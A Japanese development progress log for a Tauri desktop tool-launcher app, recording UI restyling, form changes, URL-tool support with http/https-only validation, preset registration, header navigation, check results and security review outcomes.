- **021 カスタムネイティブタイトルバー（Docker Desktop 風）**: macOS=`titleBarStyle:"Overlay"`＋`hiddenTitle`＋`trafficLightPosition`（ネイティブ信号機維持）、Windows=`lib.rs` で `#[cfg(windows)] set_decorations(false)`＋自作 min/max/close。両 OS ドラッグ移動（`data-tauri-drag-region`）。OS 判定は自前コマンド `host_os`＋`useHostOs` フック。
- **セキュリティレビュー実施**: 判定「軽微な懸念あり・修正必須なし」。指摘の未使用 capability `core:window:allow-is-maximized` を**削除済み**（残りは start-dragging/minimize/toggle-maximize/close）。
- typecheck / lint / cargo check すべて成功。

### 変更した主要ファイル

- frontend: `src/components/Header.tsx`（新規）, `Header.module.css`（新規）, `Window.tsx`/`Window.module.css`, `Sidebar.tsx`/`Sidebar.module.css`, `App.tsx`, `features/platform/useHostOs.ts`（新規）
- Rust/config: `src-tauri/src/lib.rs`（`host_os` コマンド・Windows `set_decorations(false)`）, `src-tauri/tauri.conf.json`（Overlay/hiddenTitle/trafficLightPosition）, `src-tauri/capabilities/default.json`（core:window 4 permission）
- assets: `public/icon.png`（新規コピー）, `public/fonts/`（Gloock self-host, ユーザー追加）
- docs: `docs/security.md`（021 セクション）, `docs/progress.md`

### まだ未完了のこと（重要・次の主題）

- **macOS 信号機ボタンの上下中央寄せが未解決**。`trafficLightPosition.y` を 24→26→28 と調整したが、ユーザーは「まだ中央でない、もっと下が正しいはず」と指摘。ユーザーの問い＝「結局は具体的な数値を指定するしかないのか？」。
  - 判明事項: キー名 `trafficLightPosition` は正しい（`tauri-utils-2.9.3/src/config.rs:2061-2065`）。前提「titleBarStyle:Overlay かつ decorations:true」も満たす（macOS の decorations は既定 true）。`y` はウィンドウ上端からの**固定 px オフセット**。ヘッダー高は現状 65px（`Header.module.css:7`）。
  - 未確定: 実測でどの y が中央になるか。ボタン実寸/オフセット基準（上端 or 中心）が想定とズレている可能性。`y` を増やすほど下がるので、次は **y を 30〜34 あたりまで上げて実機で追い込む**のが素直。
  - 代替案（数値ハードコードを避けたい場合）: Tauri v2 に安定版の runtime 位置設定 API は無いが、既存依存 `objc2-app-kit` で標準ボタン（`NSWindow.standardWindowButton`）を setup 後に手動 reposition する手がある（追加依存なし）。ただし複雑化するため、まずは config の y 追い込みを推奨。

### 次にやるべきタスク

1. macOS で `pnpm tauri dev` を**完全再起動**して信号機位置を実測し、中央になる `y` を確定（次は y=30〜34 を試す）。config 変更は **HMR では反映されない**ため必ず Tauri プロセス再起動が必要。
2. 実機確認（macOS）: ヘッダー常時表示 / ドラッグ移動 / 二重見出しなし / ライト・ダーク破綻なし / 全画面。
3. （別環境があれば）Windows のフレームレス＋自作 min/max/close 実挙動確認。

### 既知のエラー

- `pnpm tauri dev` で **`Error: Port 1420 is already in use`**。原因は前回の孤児 Vite プロセスがポート1420を占有（`vite.config.ts` は `strictPort:true` のため別ポートに逃げず即エラー）。**コードのバグではない**。対処: `lsof -ti tcp:1420 | xargs kill 2>/dev/null` してから `pnpm tauri dev`。

### 実行した確認コマンド

- `pnpm --filter ./apps/desktop typecheck` → 成功
- `pnpm --filter ./apps/desktop lint` → 成功
- `cargo check`（src-tauri）→ 成功
- `grep`（`*.module.css` に生 hex/rgba なしを確認）

### 次回セッションで最初に読むべきファイル

- 本 handoff（docs/progress.md 末尾）
- `apps/desktop/src-tauri/tauri.conf.json`（trafficLightPosition, 現 y=28）
- `apps/desktop/src/components/Header.module.css`（ヘッダー高 65px, `data-os="macos"` の余白）
- `apps/desktop/src/components/Header.tsx`（drag region / Windows 制御ボタン）
- `docs/security.md` の「021 カスタムタイトルバー」セクション
- 参考: `~/.cargo/registry/src/*/tauri-utils-2.9.3/src/config.rs:2061`（traffic_light_position 定義）

## 2026-07-11 021 UI Design Modernization（グラデ廃止・隆起排除・枠線間引き）

配色刷新タスク（docs/tasks/021）。ユーザー要望 2・3 に対応。トークン差し替え中心・015/016 の役割トークン／ライト・ダーク両対応を維持。生 hex/rgba は増やしていない（全 `var(--...)` 経由）。

### グラデーション廃止

- `theme.css` `--btn-primary-bg`: cyan→purple の `linear-gradient(135deg,...)` を **`var(--primary)` 単色**へ（CTA フラット化）。
- `primitives .primary`: `box-shadow: var(--shadow-drop)`（グロー落ち影）を除去、hover を `filter: brightness(1.06)` に変更。
- `MainScreen .startBtn`: accent の `radial-gradient`＋`--elev-gradient` を撤廃 → `background: var(--accent-soft)`、hover は新トークン `--accent-soft-hover`。グリフ色は `--text` 維持（両テーマで可読）。
- `Sidebar .preset.active`: 2 色 `linear-gradient`（primary-soft→accent-2）を **`var(--primary-soft)` 単色**へ。選択枠（primary 48% border）は状態区別のため残置。
- **例外（ユーザー追加要望）**: 一括起動ボタンのみグラデを許容。`--btn-launch-bg`（cyan→purple、旧 `--btn-primary-bg` と同値）を復活させ、`primitives .primary.launch`（複合セレクタで `.primary` の単色を上書き）で適用。`Button` に opt-in プロップ `launch` を追加し、`MainScreen` で `launch={!anyLaunched}`（＝一括起動状態のときだけ）指定。一括停止（`.stopAll`）・他画面の primary CTA（Diagnostics/AddTool/AddPreset）は単色のまま。落ち影（glow）は復活させずグラデのみ。
- 装飾 radial ティント（AddTool `.appIcon` / `PreviewCard` / AddPreset パネル背景）は雰囲気付けとして**残す**（ユーザー確認済み。ボタン系グラデのみ撤廃方針）。

### 隆起（emboss）排除 → フラットアイコンボタン

- `MainScreen .runtimeAction` / `.move` / `.delete`、`primitives .primary.stopAll`、`AddPreset .moveBtn`（範囲拡張）から `--elev-gradient`＋`--elev-border`(border)＋`--shadow-inset`／`--shadow-1` を撤去 → 既定 `--control-bg` 面・hover `--control-bg-hover` のフラット化。
- `.startBtn`=accent 淡ティント、`.stopBtn`／`.delete`=danger 文字色＋hover `--danger-soft`。

### 枠線の間引き（モダン化）

- **撤廃した常時 border**: `primitives .secondary` / `.chip`、`Sidebar .ghost` / `.toolActionBtn`、`MainScreen .editToggle` / `.addToolBtn` / `.modeToggle`、`AddPreset .modeToggle`、`Header .navBtn`（範囲拡張）。面色＋新規 hover（`--control-bg-hover` / danger は `--danger-soft`）で表現。active 状態（editToggle.editing / ghost.active）は border を落とし `--primary-soft` 背景＋`--primary-text` で区別。
- **残した border（視認性・状態区別のため意図的）**: `formLayout .field input/select`、パネル外枠（`.panel` の `--line`）、`StatusBadge`（starting/stopped 等）、OrderBadge、iconTile、list-item 系（sidebarTool / pickerRow）。

### トークン変更（theme.css）

- 追加: `--accent-soft-hover: color-mix(in srgb, var(--accent) 16%, transparent)`（`--accent` からの派生。新基準色なし）。
- 変更: `--btn-primary-bg` → `var(--primary)`。
- 削除（フラット化で未使用化）: `--elev-gradient` / `--shadow-drop` / `--shadow-inset` / `--shadow-1` / `--btn-primary-shadow` / `--btn-ghost-border`。
- 残置: `--elev-border`（AddTool `.appIcon` の装飾枠でのみ継続使用）、`--btn-ghost-bg`（中立フラット面）。

### 変更ファイル（6）

`styles/theme.css`, `components/primitives.module.css`, `screens/main/MainScreen.module.css`, `components/Sidebar.module.css`, `screens/add-preset/AddPresetScreen.module.css`, `components/Header.module.css`。**触っていない**: AddToolScreen / PreviewCard（装飾 radial 維持）, formLayout（入力枠維持）。

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `grep`（`*.module.css` に生 hex/rgba なし）→ 該当なし。削除トークンの残参照なし。`--elev-border` は appIcon のみ。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）。
  - ライト/ダーク要注意点: ①中立フラットアイコンボタン（`--control-bg`＝text6%透過・border無し）がライト白面上で薄くなりすぎないか。薄い場合は `--surface-2`（ライトで実線面）へ切替。②`.startBtn` の accent 淡ティントの start/stop 色差。③ghost ボタンの border 撤廃後の輪郭（toolbar/footer は `--surface-2` 面上で差が付く想定）。
  - 全画面（メイン／ツール追加／プリセット追加／診断／設定／サイドバー／ヘッダー）で破綻がないか。

## 2026-07-11 022 Tool/Preset Form Polish（フォーム細部調整）

ツール/プリセットのフォーム細部を整えるタスク（docs/tasks/022）。ユーザー要望 4・5・6・7 に対応。frontend のみ。Rust モデル/DB・パス検証・自動起動ロジック（019）・アイコン自動抽出（018）は変更なし。新ライブラリ追加なし。

### (4) アイコンラベル入力欄の削除

- `AddToolScreen.tsx`: state `iconLabel`／初期化（`setIconLabel(editingTool?.iconLabel)`）／保存 payload の `iconLabel`／「アイコンラベル」フィールド（input＋ヘルプ）を削除。プレビューは `toIconLetter({ iconLabel, name })` → `toIconLetter({ name })` に変更（表示名先頭文字ベースへ）。
- `display.ts` `toIconLetter`: 引数型を `Pick<ToolRecord, "iconLabel" | "name">` → `{ iconLabel?: string; name: string }` に緩め、`tool.iconLabel?.trim()` に変更。フォールバック（iconLabel 優先→無ければ name 先頭文字）は温存。未使用化した `ToolRecord` import を削除。
- **toIconLetter 波及: ゼロ**。他5呼び出し（MainScreen×2 / Sidebar / AddPresetScreen×3）はすべて実 `Tool` レコード（`iconLabel: string` 保持）を渡すため、引数任意化後もそのまま通る。DB 残置の `icon_label` を持つ既存ツールも従来通り表示。
- **Rust/DB は非変更**。`Tool.iconLabel: string`・`CreateToolInput`/`UpdateToolInput` の `iconLabel?`（任意）は ts-rs 自動生成のまま。payload から省略しても型OK・DB は既存 default 挙動に委ねる → bindings 再生成不要。

### (5) 実行ファイルパス欄の灰色化＋文言短縮（AddToolScreen.tsx / formLayout.module.css）

- `formLayout.module.css` に `.field input.readonlyInput { color: var(--muted); }` を追加（生 hex/rgba なし・`var(--muted)` 経由）。パス input（`readOnly` 維持）に `className={layout.readonlyInput}` を付与し、非活性と分かる灰色文字に。
- フィールドヘルプを「『アプリを選択』からのみ設定できます。直接入力・編集はできません。」→ **「直接入力・編集はできません。」** のみに短縮。
- パネル見出し `<p>` を「起動したいアプリの実行ファイルを選びます。パスは『アプリを選択』からのみ設定できます。」→ **「起動したいアプリの実行ファイルを選びます。」**（フィールドヘルプとの重複を解消）。

### (6) チェックボックス余白（AddPresetScreen.module.css）

- `.bootToggle` の `gap: 10px` → **`gap: 12px`**（checkbox とラベルテキストの間隔を拡大）。

### (7) 自動起動の説明文言変更（AddPresetScreen.tsx）

- 「オンにすると、PC 起動時に stream-dock が自動起動し、このプリセットのツールを一括起動します。」→ **「PC起動時にこのプリセットに登録されたツールが自動起動されます。」**

### 変更ファイル（5・全て編集、新規なし）

`features/tools/display.ts`, `screens/add-tool/AddToolScreen.tsx`, `screens/formLayout.module.css`, `screens/add-preset/AddPresetScreen.module.css`, `screens/add-preset/AddPresetScreen.tsx`。

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `grep`（触れた `*.module.css` に生 hex/rgba なし）→ 該当なし（灰色化は `var(--muted)` 経由）。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）: アイコンラベル欄が消え、アイコンが自動抽出 PNG（無ければ表示名先頭文字）で従来通り表示／新規作成・編集・保存・プレビューが破綻しない／パス欄が灰色文字で非活性と分かりヘルプが「直接入力・編集はできません。」のみ／自動起動チェックボックスとテキストに適度な余白／説明文が新文言／ライト・ダーク両テーマで破綻なし。

## 2026-07-11 023 Browser URL Tool Support（URL ツール登録＋起動基盤）

実行ファイルだけでなく「ブラウザで開く URL（サイト）」もツール登録・起動できるようにするタスク（docs/tasks/023・ユーザー要望 8）。本タスクは**登録＋起動の基盤まで**（URL を既定ブラウザで開く）。「起動後にブラウザ上ツールの設定を自動反映」は**Out of scope（将来別タスクで設計）**。新ライブラリ追加なし（導入済み `tauri-plugin-opener` を初めて使用）。

### (1) モデル / スキーマ拡張（kind / url）

- `tools/model.rs`: `ToolKind` enum 新設（`Serialize/Deserialize/TS`・`#[serde(rename_all="lowercase")]`・`#[derive(Default)] #[default] Executable` → TS union `"executable" | "url"`）。`Tool` に `kind: ToolKind` と `url: Option<String>`、`CreateToolInput` / `UpdateToolInput` に `#[serde(default)] kind` と `#[serde(default)] #[ts(optional)] url` を追加。`executable_path` は `#[serde(default)]` 化（url 種別は空文字）。
- `tools/repository.rs`: `TOOL_COLUMNS` に `kind, url` 追加。`row_to_tool` は `kind` を String で読み `ToolKind::from_str_lenient`（未知値→`Executable`・前方互換）。`insert`/`update` に `kind.as_str()`/`url` を通す。`find_by_url`（`kind='url'` 限定）を追加。
- **スキーマ移行（`init`・冪等）**: `CREATE TABLE` からインライン index を撤去 → `ensure_column(kind, "TEXT NOT NULL DEFAULT 'executable'")` → `ensure_column(url, "TEXT")` → `DROP INDEX IF EXISTS idx_tools_executable_path;` → `CREATE UNIQUE INDEX IF NOT EXISTS idx_tools_executable_path_executable ON tools(executable_path) WHERE kind='executable';`。既存 DB も落ちない（`kind` は既存行が既定 'executable' で埋まる）。新規/既存/再起動いずれも最終状態は「部分ユニーク index のみ」で一致。
- ts-rs 再生成（`pnpm gen:bindings`）: `Tool.ts` / `CreateToolInput.ts` / `UpdateToolInput.ts` 更新 ＋ `ToolKind.ts` 新規。`features/tools/types.ts` に `ToolKind` re-export。

### UNIQUE 制約の見直し方式

- url 種別は `executable_path` が空文字になり、旧・全行 `UNIQUE(executable_path)` では空文字同士が衝突するため、**`kind='executable'` の部分ユニークインデックス**へ移行（executable の重複防止は維持）。url 種別の重複は service 層 `find_by_url` で拒否（重複防止の意図を維持）。

### (2) フォーム（AddToolScreen.tsx / .module.css）

- 種別トグル（アプリ / URL）を追加（`kind` state・segmented `.kindToggle`/`.kindOption`/`.kindActive` を CSS 追加）。URL 種別はファイル選択の代わりに **URL 入力欄（編集可）** を出し、保存前に `isValidHttpUrl`（http/https のみ）を検証（不正は保存させずインラインエラー）。アイコンは文字ラベルにフォールバック（url 種別は自動抽出しない）。保存 payload に `kind`/`url` を含め、url 種別は `executablePath: ""`。

### (3) 起動経路（Rust）／(4) 状態・停止の採用方針

- **採用方針＝ MVP「開くのみ」**: url 種別は **registry（PID 管理）に登録しない**（`Handle` enum に URL バリアントを足さない・`registry.rs`/`snapshot`/`stop_one` は無変更）。UI は url 行に「開く」ボタンだけを出し、status バッジ・停止ボタン・スピナーを出さない（`ToolRow.tsx` で **kind 分岐を state 分岐より前**に配置）。`MainScreen.tsx` に `handleOpenUrl`（`launchTool(toolId)` を呼び URL を開くだけ・行 state を変えない）を追加、`onOpen` を kind で出し分け、`isActiveRow` で url 種別を「起動済み」カウント・一括停止トグルから除外。
- **url 起動経路とスキーム検証**: `process/service.rs::open_url(app, tool)` を新設。`validate_http_url(tool.url)` で **http/https 限定**に再検証してから `app.opener().open_url(url, None)`（既定ブラウザ委譲・shell 非経由・新規 spawn 面なし）。`launch_tool` command に `app: AppHandle` を追加し `tool.kind == Url` を分岐（registry 非登録・`launch_id:"" / process_id:0` を返す・ログは「{name} を開きました」でツール名のみ）。一括起動は `launch_preset_targets`/`launch_one` に `app` を渡し、url 種別は `open_url` で `success=true, launch_id=None`（registry 非登録・一括停止対象外）。`lib.rs::boot_launch_presets` は手持ちの handle を渡すだけ。
- **URL 検証ヘルパ**: `util.rs::validate_http_url(raw)` を新設（trim → 非空 → 制御文字拒否 → `http://`/`https://` プレフィックス限定・大小無視）。**保存時（tools/service）と起動時（process/service）の両方**で使う多層防御。`javascript:` / `file:` / `data:` / 独自スキームは拒否。

### (5) opener capabilities scope

- URL は Rust `OpenerExt`（**IPC 非経由・ACL 非対象**）で開くため frontend は opener コマンドを一切呼ばない。`capabilities/default.json` から **`opener:default` を削除**（`allow-open-url`/`allow-reveal-item-in-dir`/`allow-default-urls` の JS 露出を排除）。広い許可の追加なし（むしろ縮小）。Rust 側 open は capabilities に依存しないため削除しても URL 起動は壊れない（019 autostart の ManagerExt IPC 非経由と同型）。

### Out of scope（将来検討）

「起動後にブラウザ上ツールの設定を自動反映」（拡張連携・プロファイル注入・自動操作）／埋め込み WebView ／url ツールの停止・タブ制御・複数ブラウザ選択・ブラウザ指定起動／一括起動での url 高度順序制御／新規ライブラリ追加。

### 変更ファイル（Rust 8・生成物 4・Frontend 5）

Rust: `tools/model.rs`, `tools/repository.rs`, `tools/service.rs`, `util.rs`, `process/service.rs`, `process/commands.rs`, `lib.rs`, `capabilities/default.json`。生成物: `bindings/{Tool,CreateToolInput,UpdateToolInput}.ts` 更新 ＋ `bindings/ToolKind.ts` 新規。Frontend: `features/tools/types.ts`, `types.ts`, `screens/add-tool/AddToolScreen.tsx`(+`.module.css`), `screens/main/MainScreen.tsx`, `screens/main/ToolRow.tsx`。

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `cd apps/desktop/src-tauri && cargo check` → 成功
- `pnpm gen:bindings`（ts-rs 25 tests pass）→ bindings 差分は kind/url/ToolKind のみ
- **security-review 実施済み（本タスク必須）→ 判定「問題なし」**: frontend から任意 URL/コマンドを渡せない（toolId のみ・URL は Rust 側 `validate_http_url` で http/https 検証）／`javascript:`・`file:`・`data:` 等の危険スキームを拒否／opener capabilities は最小（`opener:default` 削除・広い許可の追加なし）／新規 spawn 面・shell・外部通信を増やしていない（OS 既定ブラウザに委譲）／`ensure_column`＋`DROP/CREATE IF (NOT) EXISTS` が冪等で既存 DB を壊さない。軽微観察: URL 内の半角空白は未拒否だが opener へ配列引数で単一文字列渡し（shell 非経由）のため注入面なし・据え置き。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）: 種別トグルでアプリ/URL を選べ URL は http/https を保存・再表示（不正スキームを弾く）／url 起動で既定ブラウザが開く（frontend は toolId のみ・`opener:default` 削除後も Rust 側 open が動作）／既存 executable ツールが従来どおり／url 行に stop/status が出ない／既存 DB で起動後に落ちない／一括起動に url を含めても破綻しない。

## 2026-07-12 024 Tool → Preset Registration（ツール追加と同時にプリセット登録）

ツール追加画面の「登録先プリセット」「追加位置」を表示専用スタブ（`mockData` ハードコード配列）から**本実装**へ。ツール新規登録と同時に、選んだプリセットへそのツールを登録できるようにした。frontend のみ・既存 command 再利用（新規 command / capabilities / ライブラリなし）。

### (1) 登録先プリセットの実データ化

- `AddToolScreen` を props ベースに変更（`presets: PresetRecord[]` / `presetItems: PresetItemRecord[]` を追加）。App が既に保持する `usePresets()` / `usePresetItems()` の結果を props で配布する既存方針に合わせ、画面内で `usePresets()` を二重に呼ばない。
- 登録先 select の option は `presets.map(p => <option value={p.id}>{p.name}</option>)` ＋ **末尾に固定センチネル `<option value="">プリセットには追加しない</option>`**。state `targetPreset` の既定値は `""`（＝追加しない）。
- **プリセット 0 件時**は select を `disabled` にし value は `""` のまま固定（「追加しない」相当）。ヘルプ文言は 0 件時「先にプリセットを作成してください。」／それ以外「選んだプリセットにこのツールを登録します。」（「今後のバージョンで対応予定」を撤去）。

### (2) 追加位置の条件表示

- `isRealPreset = targetPreset !== ""` が true のとき（実プリセット選択時）だけ「追加位置」ブロックを表示。非活性・「追加しない」（`""`）時は自動的に非表示。
- 選択肢を **`tail`（末尾に追加）/ `head`（先頭に追加）/ `parallel`（並行（順番なし））** の 3 択に簡素化（value 固定の `InsertMode` union）。mockData の 4 択（「選択して追加」含む）は撤去。state `insertMode` 既定 `"tail"`。

### (3) 保存時のプリセット登録（`handleSave`・新規時のみ）

- 新規分岐で `createTool(input)` の戻り値 `created` を受ける（従来は破棄）。編集分岐（`updateTool`）・URL バリデーション・payload 構成は無変更。
- **`!isEdit && isRealPreset` のときのみ** プリセット登録:
  - `launchMode = insertMode === "parallel" ? "parallel" : "ordered"`。
  - `addToolToPreset({ presetId: targetPreset, toolId: created.id, launchMode })`（末尾自動採番）→ 戻り値 `item`（新 PresetItem）。
  - **`head` のみ** 続けて `reorderPresetItems(targetPreset, [item.id, ...existingIds])`。`existingIds` は props の `presetItems` を `presetId` で絞り `orderIndex` 昇順に並べた既存 item id。Rust `reorder`（`preset_items/service.rs:105`）が「対象プリセットの全 item id・件数一致」を要求するため、新規＋既存の全 id を渡す。`list_preset_items` は呼ばず、許可 command（`create_tool`/`add_tool_to_preset`/`reorder_preset_items`）のみ利用。
  - **API 呼び出し順**: `create_tool` → `add_tool_to_preset` →（head 時のみ）`reorder_preset_items`。
- **失敗時**: `try/catch` は従来どおり `handleSave` 全体を包む。`createTool` 成功後に `addToolToPreset`/`reorderPresetItems` が失敗しても `toErrorMessage` でエラー表示するのみで**ツール作成のリトライはしない**（ツールは作成済み・二重作成を回避）。成功時は既存どおり `onSaved?.()` → `onNavigate("main")`。
- App の `onSaved` を `reloadTools()` ＋ `reloadPresetItems()` に変更（プリセット登録がメイン画面のツール構成へ即反映されるよう。編集・「追加しない」時も items 再読込するが安価・副作用なし）。

### (4) スタブ整理

- `data/mockData.ts`（`targetPresetOptions` / `insertModeOptions` のみ残っていた）を**削除**。他参照なし（`AddToolScreen` からのみ import）。import 文も除去。
- 「表示のみに使う（保存には関与しない）」コメントを実装済み内容に更新。

### やらないこと（維持）

編集時のプリセット登録 UI（`!isEdit` でのみ表示）／Rust command・モデル・DB スキーマ変更／挿入位置の任意指定・launch group・待機秒・複数プリセット同時登録／新規ライブラリ・command・capabilities。

### 変更ファイル（Frontend 3）

- `screens/add-tool/AddToolScreen.tsx`（props 追加・state 実データ化・条件表示・保存フロー）
- `App.tsx`（`presets`/`presetItems` を props で渡す・`onSaved` で items も再読込）
- `data/mockData.ts`（削除）

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `git diff --stat` → 上記 3 ファイルのみ（App.tsx / mockData.ts 削除 / AddToolScreen.tsx）
- **セキュリティ確認（docs/security.md 準拠）**: frontend のみ。新規 Tauri command / capabilities を追加せず既存 `create_tool`/`add_tool_to_preset`/`reorder_preset_items` のみ利用（`AddToolScreen` に直接 `invoke` なし）。frontend から渡すのは `presetId`/`toolId`/`launchMode` のみ（任意 path/command を渡さない）。外部通信・外部リソースを増やさない。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）: 登録先が実データから選べ選んだプリセットに登録される／プリセット 0 件で登録先セレクトが非活性・「追加しない」固定／追加位置が「追加しない」・非活性時は非表示、実プリセット選択時のみ表示／「末尾＝addToolToPreset・先頭＝続けて reorderPresetItems・並行＝launchMode parallel」が実挙動と一致／プリセット登録失敗時にエラー表示されツールの二重作成が起きない／「追加しない」選択時はツールのみ作成／編集時は登録先/追加位置が出ない／ライト・ダーク両テーマで破綻しない。

## 2026-07-12 025 Form/UI Polish Round 2（フォーム/UI 細部整理・frontend のみ）

022 に続くフォーム/UI の細部整理。表示されない未使用フォームの削除、プレビュー枠のフラット化、ツール編集時の種別トグル非表示、メイン画面編集中フッタの不要要素削除。frontend のみ・Rust / DB / bindings 変更なし・新規ライブラリ / 外部リソースなし。

### (1) プリセット説明欄の削除（`AddPresetScreen.tsx`）

- UI のどこにも表示されない write-only な「説明」欄を削除。Step1 の「説明」フィールド JSX（label〜fieldHelp「サイドバーや一覧の補足として使えます。」）を撤去。
- 関連 state `description` / `setDescription`・初期化 `setDescription(editingPreset?.description ?? "")`・保存 payload の `description`（`saveCreate` の `createPreset` / `saveEdit` の `updatePreset`）を整理し、両 API へ `description` を送らない。
- **整理範囲**: state 定義 1 / 初期化 1 / payload 2 / JSX フィールド 1。`toLaunchItem` の `tool.description`（tool 側）は無関係で無変更。
- **残置方針**: `CreatePresetInput` / `UpdatePresetInput` は `description?` が任意のため省略で typecheck が通る。Rust の Preset モデル / DB の `description` カラム・`PresetRecord.description` 型は残置（022 の `icon_label` と同方針・破壊的変更は範囲外で既存 default 挙動に委ねる）。

### (2) プレビュー枠のフラット化（`PreviewCard.module.css` `.newRow`）

- ハイライト行 `.newRow` の accent `border`（`color-mix(... --accent 30% ...)`）と radial-gradient ＋ `--accent-soft` 背景を撤廃。「枠/影」に見えパネル（`.panel` 上辺 `--line`）と干渉していた状態を解消。
- フラットな単色面 `background: var(--surface-2)` に置換（border なし・グラデなし）。`margin`/`padding`/`border-radius` は維持。021 のフラット方針に整合。生の hex/rgba は残さず全て `var(--...)` 経由。

### (3) ツール編集時の種別トグル非表示（`AddToolScreen.tsx`）

- アプリ/URL 種別トグル（`role="tablist"` の `.kindToggle` ブロック）を `{!isEdit && ( ... )}` で囲み、編集時は非表示に。編集時は種別切替 UI が無く `setKind` が呼ばれないため `editingTool.kind`（70/83 行で初期化）のまま固定。
- **編集時 kind 分岐**: パネル見出し（`isUrlKind ? "URL を入力" : "アプリを選択"`）・selectedApp・フォーム分岐（URL 入力 / 実行ファイルパス readOnly）は全て既存の `isUrlKind` 由来で自動的に対象種別が出る。executable 編集は実行ファイル系のみ、url 編集は URL 入力のみ編集可（種別切替不可）。分岐ロジック / state / 見出しは無変更。

### (4) メイン画面編集中フッタの削除（`MainScreen.tsx` / `MainScreen.module.css`）

- `MainScreen.tsx` の `{editMode && ( <div className={styles.footerActions}> ... </div> )}` ブロック全体（未配線プレースホルダ Button「起動間隔を設定」「PC起動時の動作」）を削除。`Button` import は他所で使用継続のため残置。
- `MainScreen.module.css` の `.footerActions`（囲み枠 `border`/`border-radius`/`background`）と未使用になる `.footerButtons` を削除。編集モードは items 一覧で自然終了しレイアウト非破綻。

### やらないこと（維持）

Rust モデル / DB スキーマ変更（description カラム削除しない）／024 のプリセット登録本実装・021 の配色/ボタンモダン化追加／「起動間隔」「PC起動時の動作」機能の実装（削除のみ・将来別タスク）／プレビュー以外のスタイル刷新／新ライブラリ・外部リソース追加。

### 変更ファイル（Frontend 5）

- `screens/add-preset/AddPresetScreen.tsx`（description 削除）
- `components/PreviewCard.module.css`（`.newRow` フラット化）
- `screens/add-tool/AddToolScreen.tsx`（種別トグル `!isEdit` ガード）
- `screens/main/MainScreen.tsx`（編集中フッタ削除）
- `screens/main/MainScreen.module.css`（`.footerActions` / `.footerButtons` 削除）

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `git diff --name-only` → 上記 5 ファイル ＋ `docs/progress.md` のみ
- 生の hex/rgba 残置なし（touched CSS 2 ファイルを grep 済み・全て `var(--...)`）／削除に伴う未使用 state / import / スタイルなし（`Button` は MainScreen で継続使用を確認）
- **セキュリティ確認（docs/security.md 準拠）**: frontend のみ。OS 操作 / ファイル操作 / プロセス操作を追加せず（§2/§4）、外部リソース・外部通信・telemetry を増やさない（§1/§CSP）。パス設定・ファイル選択の既存仕様は無変更。新規 command / capabilities / ライブラリなし。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）: プリセット追加/編集画面から「説明」欄が消え作成・編集・保存が破綻しない（Rust の description カラム残置）／ツール追加後プレビューのハイライト枠がフラットになりパネル上辺の線が正常表示／ツール編集画面でアプリ/URL トグルが表示されず対象種別の項目のみ編集可（executable・url 両方で確認・種別切替不可）／メイン画面編集中の「起動間隔を設定」「PC起動時の動作」と囲み枠線が消えレイアウト非破綻／ライト・ダーク両テーマで破綻しない。

## 2026-07-12 026 Header Polish & Navigation Foundation（ヘッダーの見た目/導線整備・frontend のみ）

020 で新設した共通ヘッダーを見た目と導線の両面で整える。右アイコンのフラット白化・メイン戻り導線・機能大別の導線土台。frontend のみ・Rust / DB / bindings 変更なし・新規ライブラリ / 外部リソースなし・`Screen` union 無変更（実機能画面は作らない）。

### (1) 右アイコンのフラット白化（`Header.tsx` / `Header.module.css`）

- 診断🩺 / 設定⚙ の**絵文字を単色インライン SVG（`currentColor`）へ置換**（絵文字は CSS `color` で白くできないため）。診断＝パルス/活動ライン、設定＝歯車。`viewBox 0 0 24 24`・`width/height 22px`・塗り無し・`stroke: currentColor`。既存 Windows 制御ボタンと同方式で外部リソースなし（§CSP 準拠）。`title`/`aria-label` は現行文言維持。
- `.navBtn` から `background: var(--btn-ghost-bg)`（うっすら枠の正体）・`border-radius`・`.navBtn:hover` の背景変化・`.navBtn.active` の surface チップを**撤去**。`background: transparent; border: 0` でフラット化。色は `var(--btn-primary-fg)`（白系トークン）維持。
- active/非active/hover は **`opacity` の濃淡のみ**で表現（非active 0.72 / active・hover 1.0）。枠・チップ・背景変化なし。アイコンは 16px→22px（SVG）で拡大、ボタンのタップ領域 36px は維持。

### (2) メイン画面リンク（`Header.tsx` / `Header.module.css` / `App.tsx`）

- 左ロゴ（img + ワードマーク）を `<div data-tauri-drag-region>` から **`<button onClick={() => onNavigate("main")} aria-label="メイン画面へ">` 化**し、ロゴ自身の `data-tauri-drag-region` を除去。`.brand` に button リセット（`background: transparent; border: 0; padding: 0; cursor: pointer`）＋既存 flex/gap 維持。
- **ドラッグ両立方式**: header 要素自体の `data-tauri-drag-region` は残置。ロゴ〜ナビ間の余白でウィンドウドラッグが従来どおり効き、ロゴ領域のみクリック→メイン遷移。ドラッグ領域とクリック領域を要素単位で切り分け。
- **activeNav 拡張**: 型を `Extract<Screen, "diagnostics" | "settings">` → `"main" | "diagnostics" | "settings"` に拡張。`App.tsx` の導出を `screen === "main"` でも `activeNav = screen` とし、メイン時のセクション導線 active 表示に整合（`types.ts` は無変更）。

### (3) 機能大別への導線土台（`Header.tsx` / `Header.module.css`）

- **右詰め・診断/設定の左側**にセクション導線 `.sections` を新設。データ駆動の `SECTIONS` 配列（`{ id, label, screen?, enabled }`）で描画。当面「ツール管理」のみ `enabled: true`（→ `onNavigate("main")`・`activeNav==="main"` で active）、他（OBS 連携 / おすすめツール / 読み上げ連携）は `disabled` の placeholder（`title="近日対応"`）。
- **構造の土台まで**: `Screen` は増やさず placeholder は無効ボタンのみ。将来の「大項目→プルダウン」は配列を入れ子に拡張していく想定（ドロップダウン UI は今回作らない）。
